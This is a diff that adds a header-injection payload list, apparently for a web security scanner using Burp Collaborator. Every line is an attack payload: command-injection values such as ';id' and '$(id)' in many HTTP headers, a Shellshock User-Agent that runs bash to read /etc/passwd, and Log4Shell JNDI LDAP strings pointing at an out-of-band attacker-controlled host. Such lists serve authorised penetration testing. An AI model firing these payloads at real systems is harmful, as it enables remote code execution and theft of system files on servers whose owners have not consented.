@@ -1,0 +1,25 @@
+# RCE / command injection / shellshock / log4shell via headers
+# OOB marker: $collabplz (auto-replaced by Burp Collaborator, or use -oob <domain>)
+# Fingerprints: fingerprints/rce.txt (nuclei-style regexes)
+X-Command: ;id
+X-Command: |id
+X-Command: $(id)
+X-Command: `id`
+X-Cmd: ;id
+X-Exec: ;id
+X-Execute: ;id
+X-Run: ;id
+X-Shell: ;id
+X-System: ;id
+X-Forwarded-For: ;id
+X-Forwarded-Host: $(id)
+Referer: ;id
+X-Pingback: ;id
+X-Debug: ;id
+User-Agent: () { :; }; echo; echo; /bin/bash -c "cat /etc/passwd"
+X-Api-Version: ${jndi:ldap://$collabplz/rce}
+User-Agent: ${jndi:ldap://$collabplz/rce}
+X-Search: ${jndi:ldap://$collabplz/rce}
+X-Forwarded-For: ${jndi:ldap://$collabplz/rce}
+Referer: ${jndi:ldap://$collabplz/rce}
+X-Client-IP: ${jndi:ldap://$collabplz/rce}
